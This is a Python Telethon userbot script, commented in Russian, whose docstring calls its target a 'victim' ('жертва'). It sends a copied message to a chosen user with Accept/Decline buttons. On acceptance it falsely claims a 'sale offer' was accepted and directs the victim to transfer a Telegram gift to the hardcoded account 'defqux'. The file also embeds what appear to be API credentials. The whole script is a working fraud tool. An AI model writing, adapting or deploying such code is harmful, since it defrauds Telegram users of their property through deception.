"""
Userbot. Ответь на сообщение бота командой /send @жертва
"""

import os
import asyncio
from telethon import TelegramClient, events, Button

API_ID = int(os.environ.get("API_ID", "39450533"))
API_HASH = os.environ.get("API_HASH", "52a50527f3fd4d9c1cba720590e618fe")
BUYER = os.environ.get("BUYER", "defqux")
SESSION = "session"

print("Импорт завершён", flush=True)
client = TelegramClient(SESSION, API_ID, API_HASH)


@client.on(events.NewMessage(outgoing=True, pattern=r'(?i)^/send'))
async def on_send(event):
    print(f"Получил /send: {event.raw_text}", flush=True)
    if not event.is_reply:
        await event.reply("Ответь на сообщение")
        return
    reply = await event.get_reply_message()
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply("Формат: /send @username")
        return
    target = parts[1].strip()
    try:
        entity = await client.get_entity(target)
        print(f"Отправляю в {entity.id}", flush=True)
        await client.send_message(
            entity,
            reply.message,
            formatting_entities=reply.entities
        )
        await client.send_message(
            entity,
            "Выберите действие:",
            buttons=[[
                Button.inline("✗ Отклонить", data=b"dec"),
                Button.inline("✓ Принять", data=b"acc")
            ]]
        )
        print("Отправлено", flush=True)
    except Exception as e:
        print(f"Ошибка: {type(e).__name__}: {e}", flush=True)
        await event.reply(f"Ошибка: {e}")
        return
    await event.delete()


@client.on(events.CallbackQuery)
async def on_cb(event):
    if event.data == b"dec":
        await event.edit("Предложение отклонено.", buttons=None)
        await event.answer("Отклонено")
    elif event.data == b"acc":
        await event.edit(
            "Предложение о продаже успешно принято.\n\nПередайте подарок покупателю.",
            buttons=[[Button.url("Передать", "tg://send_gift?to=defqux")]]
        )
        await event.answer("Принято")


async def main():
    print("СТАРТ", flush=True)
    await client.start()
    print("Userbot запущен.", flush=True)
    await client.run_until_disconnected()


if __name__ == "__main__":
    print("Запуск main", flush=True)
    asyncio.run(main())
